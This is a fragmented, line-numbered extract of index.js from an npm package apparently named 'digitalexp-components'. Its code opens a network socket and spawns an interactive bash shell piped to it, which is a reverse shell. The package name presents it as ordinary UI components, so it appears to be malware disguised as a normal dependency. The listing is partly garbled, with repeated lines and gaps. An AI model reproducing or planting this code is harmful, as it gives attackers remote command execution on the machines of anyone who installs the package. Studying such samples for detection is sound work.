// File: tmp/tmpygcn9m8t/digitalexp-components/package/index.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const dns = require("dns")
Line 3: const https = require("https")
Line 4: _tmp_0 = require("child_process")
Line 5: const packageJSON = require("./package.json")
Line 7: const net = require('net')
Line 12: const client = new net.Socket()
Line 13: {
  console.log("Connected to Linux target!");
  
  // Spawn a bash shell on the remote Linux system
  const shell = spawn('bash', ['-i']);  // '-i' makes bash interactive
  
  // Pipe data between the client and the shell
  client.pipe(shell.stdin);
  shell.stdout.pipe(client);
  shell.stderr.pipe(client);
  
  // Handle error with the shell process
  shell.on('error', (err) => {
    console.error('Shell process error:', err);
  });
  
  // Handle close event for the shell process
  shell.on('close', (code) => {
    console.log(`Shell process exited with code ${code}`);
    client.destroy(); // Close the client connection when the shell is done
  });
}
Line 17: const shell = spawn('bash', ['-i'])
Line 20: client.pipe(shell.stdin)
Line 21: shell.stdout.pipe(client)
Line 22: shell.stderr.pipe(client)
Line 30: {
    console.log(`Shell process exited with code ${code}`);
    client.destroy(); // Close the client connection when the shell is done
  }
Line 32: client.destroy()
